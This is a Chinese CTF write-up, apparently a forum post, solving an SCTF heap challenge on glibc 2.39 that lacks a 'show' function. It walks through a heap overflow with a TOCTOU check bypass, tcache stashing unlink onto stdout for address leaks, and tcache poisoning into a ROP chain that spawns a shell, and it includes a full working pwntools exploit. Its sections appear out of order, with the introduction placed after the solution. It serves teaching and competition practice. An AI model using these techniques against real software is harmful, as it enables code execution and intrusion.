
![](upload/attach/202606/1060264\_EN67UPSKQQRGXB3.png)

同时，在首次`malloc`时会写入堆基址

![](upload/attach/202606/1060264\_39NXCH2HCX29UUP.png)

`delete`正常`free`的逻辑，清空了全局指针，不存在UAF

![](upload/attach/202606/1060264\_GBYCZCP8CKKPMXC.png)

`edit`中硬编码了写入长度，对`0xc0`大小的堆块做写入操作时存在`0x20`大小的堆溢出

![](upload/attach/202606/1060264\_7Z8QR2R9WY9UQPN.png)

同时，在`edit`时存在一个`check`逻辑，当读入长度大于`0xD8`时进行检查，首先取当前堆块+`0xC8`位置的数据，其实对于我们要进行堆溢出操作的`0xC0`堆块而言，这个位置就是下一个堆块的`size`，如果这个`size`在`0x1F`与`0x520`之间，且没有通过`times`函数中的检查，就会直接退出程序，我们跟进`times`看看

![](upload/attach/202606/1060264\_RP9W8DF4P56EXPM.png)

传入的参数是当前堆块+`0xD8`的位置，对于`0xC0`的堆块而言，就是下一个堆块的`bk`位置，首先先获取当前堆的堆顶，如果该位置不为`0`，且`heap_base`已被初始化，就会检查这个`bk`指针是否在堆内存范围内，如果不在的话，该函数的检查就失败

![](upload/attach/202606/1060264\_6TMWHB9GA3HAABA.png)

所以，如果我们按照上述函数方法试图修改`smallbin`的`bk`指针时，就会遇到该函数的阻碍，但是想要绕过也非常非常简单，其实这里严格来说存在一个TOCTOU的漏洞，也就是我们在堆溢出时先将`size`位改为一个大于边界的数，因为是先进行的写入操作，所以在检查时根本不需要通过`times`的检查也能够正常返回菜单，而这样做会使得堆内存被打乱，此时我们只需要再次通过堆溢出再次覆写`size`为原`size`，这样的写入操作不超过`0xD8`字节，因此也不会进入检查，我们就能够在绕过检查的方式下修改`smallbin`的`bk`指针了。

![](upload/attach/202606/1060264\_HEJZZ5BBAEX9C73.png)

接下来我们对这道题进行上述方法的利用 ，首先我们先需要填满`tcache`并在`smallbin`中链入7个堆块（注意，每个堆块间应有用来分隔的堆块，否则会触发`unsortedbin`的合并机制）

```python
for i in range(7): #tcache
add(i, 2)
for i in range(6):
add(i + 7, 2)
add(14, 1) #防止合并，并且在结束循环时idx14就是我们将进行堆溢出的堆块
add(13, 2) #链表头就是这个堆块
add(15, 1) #防止与topchunk合并
for i in range(7):
delete(i) #填满tcache
add(4, 1) #这三个堆块是用来后续利用tcache进行任意地址分配的，可以先不管他们
add(5, 1)
add(6, 1)
for i in range(7):
delete(i + 7) #链入smallbin
```

我们来看此时的内存，我们恰好可以通过链表头前的堆块溢出覆写链表头的这个`smallbin`的低字节，将其改为`IO`中的地址

![](upload/attach/202606/1060264\_3PRFKCEUUYJGTXW.png)

此时我们覆写，并且将`tcache`的堆块都先申请出来，再申请一个堆块触发stash，查看情况

```python
edit(14, b"a" \* 0xC0 + p64(0) + p64(0x550) + p64(0) + b"\x50\x45")
edit(14, b"a" \* 0xC0 + p64(0) + p64(0x101)) #上述提到的绕过检查的方法
for i in range(7):
add(0, 2) #tcache
add(0, 2) #触发stash
```

可以看到，我们想要申请的地址已经进入了`tcache`，我们只需要再进行一次`malloc`就实现了申请到`IO`，但与此同时值得注意的是，`smallbin`中的链表已经被我们破坏了（`bin`的`fd`依然指向我们利用的堆块），也就意味着我们无法在`tcache`填满后对这个`size`进行申请，会触发双向链表检查报错

![](upload/attach/202606/1060264\_J63T58PVX8U3747.png)

我们再修改`stdout`的字段，使得我们能拿到原本在`_IO_buf_end`的地址，从而计算`libc`的基地址

```python
add(1, 2)
edit(1, p64(0) \* 12 + p64(0xFBAD1887) + p64(0) \* 3 + b"\x00")
rc(20)
libc_base = uu64(rc(6)) - 0x204644
slog(b"libc", libc_base)
```

![](upload/attach/202606/1060264\_9MWZKSB9APPUVDJ.png)

那么此时，我们通过控制`stdout`的字段就能实现任意地址读写，我们可以通过读`main_arena`拿到堆基址、读`environ`拿到栈地址

```python
def show(addr, size):
payload = (
p64(0) \* 12
+ p64(0xFBAD1887)
+ p64(0) \* 3
+ p64(addr)
+ p64(addr + size)
+ p64(addr + size)
)
edit(1, payload)
rc(20)
show(libc_base + 0x203B20, 6)
heap_base = uu64(rc(6)) - 0x1B50 - 0x1A0 - 0xD0
slog(b"heap", heap_base)
show(libc_base + 0x20AD58, 6)
environ = uu64(rc(6))
slog(b"stack", environ)
```

![](upload/attach/202606/1060264\_BFD6K6DWG8HSJV7.png)

那么我们拥有堆、栈、`libc`地址后，就可以通过`tcache_poisoning`直接劫持返回地址控制执行流了，但是由于上述所说的原因，我们没有办法从`smallbin`中再取对应`size`的堆块，所以我们提前布置好就好。

```python
delete(4)
delete(6)
chunk = heap_base + 0x1710
edit(
5,
b"/bin/sh\x00"
+ b"a" \* 0xB8
+ p64(0)
+ p64(0xD1)
+ p64(safe(chunk, environ - 0x178)) #safe-linking
+ p64(0),
)
slog("ret", environ - 0x128)
add(6, 1)
add(4, 1)
bin_sh = heap_base + 0x1720
pop_rdi = libc_base + 0x10F75B
edit(
4,
p64(0)
+ p64(1)
+ p64(2)
+ p64(pop_rdi + 1)
+ p64(pop_rdi)
+ p64(bin_sh)
+ p64(libc_base + libc.sym["system"]),
)
sh()
```

![](upload/attach/202606/1060264\_6PCRTP5M98WSMEB.png)

exp附下:

```python
#!/usr/bin/env python3
from pwn import * # type: ignore
context.terminal = ["wt.exe", "-w", "0", "split-pane", "bash", "-c"]
file_name = "./pwn"
libc_position = "/root/glibc-all-in-one/libs/2.39-0ubuntu8_amd64/libc.so.6"
remote_addr = ""
remote_port = ""
e = ELF(f"{file_name}")
context.binary = e
context.log_level = "debug" # error/debug
libc = None
if args.REMOTE:
p = remote("pwn-9a9324aec6.adworld.xctf.org.cn", 9999, ssl=True)
elif args.GDB:
gdbscript = """"""
p = gdb.debug(file_name, gdbscript=gdbscript)
else:
p = process(file_name)
if libc_position != "":
libc = ELF(f"{libc_position}")
assert libc is not None
sd = lambda a: p.send(a)
sl = lambda a: p.sendline(a)
rc = lambda a=4096: p.recv(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)
uu32 = lambda a: u32(a.ljust(4, b"\x00"))
uu64 = lambda a: u64(a.ljust(8, b"\x00"))
sh = lambda: p.interactive()
slog = lambda name, addr: log.success(f"{name} ==> {hex(addr)}")
def debug(cmd=""):
if not args.REMOTE:
gdb.attach(p, cmd)
pause()
def safe(a, b):
return b ^ (a >> 12)
def choice(a):
ru(b"> ")
sl(str(a).encode())
def add(a, b):
choice(1)
ru(b"ex:")
sl(str(a).encode())
ru(b"choice:")
sl(str(b).encode())
def delete(a):
choice(2)
ru(b"ex:")
sl(str(a).encode())
def edit(a, b):
choice(3)
ru(b"ex:")
sl(str(a).encode())
ru(b"ata:")
sd(b)
for i in range(7):
add(i, 2)
for i in range(6):
add(i + 7, 2)
add(14, 1)
add(13, 2)
add(15, 1)
for i in range(7):
delete(i)
add(4, 1)
add(5, 1)
add(6, 1)
for i in range(7):
delete(i + 7)
add(15, 3)
edit(14, b"a" \* 0xC0 + p64(0) + p64(0x550) + p64(0) + b"\x50\x45")
edit(14, b"a" \* 0xC0 + p64(0) + p64(0x101))
for i in range(7):
add(0, 2)
add(0, 2)
pause()
add(1, 2)
rc()
edit(1, p64(0) \* 12 + p64(0xFBAD1887) + p64(0) \* 3 + b"\x00")
rc(20)
libc_base = uu64(rc(6)) - 0x204644
slog(b"libc", libc_base)
def show(addr, size):
payload = (
p64(0) \* 12
+ p64(0xFBAD1887)
+ p64(0) \* 3
+ p64(addr)
+ p64(addr + size)
+ p64(addr + size)
)
edit(1, payload)
rc(20)
show(libc_base + 0x203B20, 6)
heap_base = uu64(rc(6)) - 0x1B50 - 0x1A0 - 0xD0
slog(b"heap", heap_base)
show(libc_base + 0x20AD58, 6)
environ = uu64(rc(6))
slog(b"stack", environ)
show(environ - 0xA0, 8)
delete(4)
delete(6)
chunk = heap_base + 0x1710
edit(
5,
b"/bin/sh\x00"
+ b"a" \* 0xB8
+ p64(0)
+ p64(0xD1)
+ p64(safe(chunk, environ - 0x178))
+ p64(0),
)
slog("ret", environ - 0x128)
add(6, 1)
add(4, 1)
bin_sh = heap_base + 0x1720
pop_rdi = libc_base + 0x10F75B
edit(
4,
p64(0)
+ p64(1)
+ p64(2)
+ p64(pop_rdi + 1)
+ p64(pop_rdi)
+ p64(bin_sh)
+ p64(libc_base + libc.sym["system"]),
)
sh()
```

# 引言

前段时间笔者看到了[@B1t3](https://bbs.kanxue.com/user-home-1048393.htm)师傅的[[原创]trx ctf 2026 house of fishing](https://bbs.kanxue.com/thread-291112-1.htm)，复现了一下，原题是常规的增删查改程序但缺失`show`（查）的情况下通过`UAF`+`Larginattack`+`tcache stashing unlink`实现一个任意地址分配，从而污染某个特定的数据使得后门函数的进入条件通过，笔者在复现后思考，如果删除后门函数，能否在无`show`+`UAF`的情况下实现劫持程序执行流，发现`tcache stashing unlink`结合其他技术可以在无`show`的情况下做到劫持程序执行流，遂发表在评论区。

而这两天刚好SCTF出了一道类似考点的题目，也是考察在程序没有`show`时的堆利用，笔者尝试上述方法发现可解，因此有了这篇文章来记录该攻击方法。

# 前置知识

## tcache stashing unlink

how2heap中的源码（去除相关注释）
